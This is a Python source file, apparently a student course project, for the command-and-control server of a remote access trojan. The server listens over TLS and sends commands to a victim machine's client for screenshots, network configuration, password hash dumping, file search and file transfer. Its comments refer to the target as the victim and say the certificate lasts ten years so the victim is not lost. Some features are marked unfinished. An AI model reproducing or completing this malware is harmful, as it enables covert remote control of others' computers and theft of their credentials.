# Description: Serveur pour le projet Python RAT
# Authors: Dorin MUNCIULENU, Mikaël (rentre ton nom de fa;mille) 4SI4
# Date: 31/01/2024 23h59 depassé

import socket
import ssl
import os # pour les appels système et la recherche de fichiers


# Importer les modules de cryptographie pour générer des clés et des certificats
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
import datetime


def generate_key():
    """Génère une clé privée RSA."""
    return rsa.generate_private_key(
        public_exponent=65537,
        key_size=4096,
    )

# ce code vient du site https://cryptography.io/en/latest/x509/reference.html et https://gist.github.com/bloodearnest/9017111a313777b9cce5
# ainsi que d'autres sites de debug en lien
def generate_cert(subject_name, issuer_name, private_key):
    """Génère un certificat auto-signé."""
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "FR"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Some-State"),
        x509.NameAttribute(NameOID.LOCALITY_NAME, subject_name),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "My Organization"),
        x509.NameAttribute(NameOID.COMMON_NAME, issuer_name),
    ])

    cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        private_key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.datetime.utcnow()
    ).not_valid_after(
        # Le certificat est valide pour 10 ans car on ne veut pas perdre notre victime !
        datetime.datetime.utcnow() + datetime.timedelta(days=3650)
    ).add_extension(
        x509.SubjectAlternativeName([x509.DNSName(issuer_name)]),
        critical=False,
    ).sign(private_key, hashes.SHA256())

    return cert

def save_cert_and_key(cert, key, cert_path, key_path):
    """Sauvegarde le certificat et la clé"""
    with open(cert_path, "wb") as cert_file:
        cert_file.write(cert.public_bytes(serialization.Encoding.PEM))

    with open(key_path, "wb") as key_file:
        key_file.write(key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))

def need_certif(cert_path, key_path, name):
    """Vérifie si le certificat et la clé existent, les génère sinon."""
    if not os.path.exists(cert_path) or not os.path.exists(key_path):
        print(f"Création du certificat et de la clé pour {name}...")
        key = generate_key()
        cert = generate_cert(name, name, key)
        save_cert_and_key(cert, key, cert_path, key_path)

# les cles doivent etre dans le meme repertoire que le serveur
def create_server_socket(host, port):
    """Crée un socket serveur sécurisé."""
    # Assurez-vous que les certificats et les clés existent
    need_certif("server_cert.pem", "server_key.pem", "Server")
    
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile='server_cert.pem', keyfile='server_key.pem')
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    secure_server_socket = context.wrap_socket(server_socket, server_side=True)
    
    secure_server_socket.bind((host, port))
    secure_server_socket.listen(5)
    print(f"Serveur démarré et écoute sur {host}:{port}")
    
    return secure_server_socket


def accept_client(secure_server_socket):
    """Accepte une nouvelle connexion client."""
    client_socket, address = secure_server_socket.accept()  # Accepter une nouvelle connexion
    print(f"Connexion acceptée de {address}")
    return client_socket


def send_command(client_socket, command):
    """Envoie une commande au client."""
    print(f"Envoi de la commande : {command}")
    client_socket.sendall(command.encode('utf-8'))

def help_command():
    """Affiche la liste des commandes disponibles."""
    print("Commandes disponibles :")
    print("  - help : Affiche cette aide")
    print("  - download <filename> : TODO")
    print("  - upload <filename> : Envoie un fichier")
    print("  - ipconfig : obtenir la configuration réseau de la machine victime")
    print("  - screenshot : Prend une capture d'écran")
    print("  - hashdump : Renvoie les hachages des mots de passe")
    print("  - search <filename> : Recherche un fichier")
    print("  - shell : TODO")
    print("  - exit : Ferme la connexion")

def receive_response(client_socket):
    """Reçoit la réponse du client."""

    print("Réception de la réponse...")
    response = ""
    while True:
        part = client_socket.recv(1024).decode('utf-8')
        if part == "END_OF_RESPONSE":
            break
        response += part
    if response == "help":
        help_command()
    else :
        print("Réponse reçue :")
        print(response)

# ne fonctionne pas.. notre v1 telechargeait le fichier au moins meme si le contenu deconnait
def download(client_socket, filename):
    """Reçoit un fichier du client."""
    try:
        print(f"Réception du fichier {filename} du client...")
        with open(filename, 'wb') as file:
            while True:
                bytes_read = client_socket.recv(1024)
                if bytes_read.endswith(b"END_OF_FILE"):
                    file.write(bytes_read[:-len(b"END_OF_FILE")])
                    break
                file.write(bytes_read)
        print(f"Fichier {filename} reçu avec succes!!!!!!!!!") # malheureusement, le fichier est vide
    except Exception:
        return "ERROR_FD"  # FD: File Download


# ca fonctionne !!!
def upload(client_socket, file_path):
    """Envoie un fichier au client."""
    try:
        # Vérifier si le fichier existe
        if not os.path.exists(file_path):
            send_command(client_socket, "ERROR: File not found.")
            return
        
        # Envoyer un signal d'initiation de transfert de fichier
        send_command(client_socket, f"START_FILE_UPLOAD:{os.path.basename(file_path)}")
        
        with open(file_path, 'rb') as file:
            while True: # 1024 par 1024
                bytes_read = file.read(1024)
                if not bytes_read:
                    break
                client_socket.sendall(bytes_read)

        send_command(client_socket, "END_OF_FILE")
    except Exception as e:
        print(f"Erreur lors de l'envoi du fichier : {e}")
        send_command(client_socket, "ERROR: File upload failed.")



if __name__ == "__main__":
    HOST, PORT = '0.0.0.0', 51821  # Écoute sur toutes les interfaces disponibles de mon raspberry/windows
    server_socket = create_server_socket(HOST, PORT)

    while True:
        client_socket = accept_client(server_socket)
        print("Client connected. help is the solution to all your problems.")
        
        while True:
            command = input("Veuillez entrer la commande q envoyer (ou exit pour fermer le client) : ")
            if command.lower() == 'exit':
                send_command(client_socket, command)  # close client
                break

            elif command.startswith("download "):
                # Envoyer la commande avant de se mettre en attente de la réception du fichier
                send_command(client_socket, command)
                filename = command.split(" ", 1)[1]
                download(client_socket, filename)

            elif command.startswith("upload "):
                file_path = command.split(" ", 1)[1]  # Extraire le chemin du fichier de la commande
                upload(client_socket, file_path)

            else:  # commande basique
                send_command(client_socket, command)
                receive_response(client_socket)

        client_socket.close()
        if command.lower() == 'exit':
            break

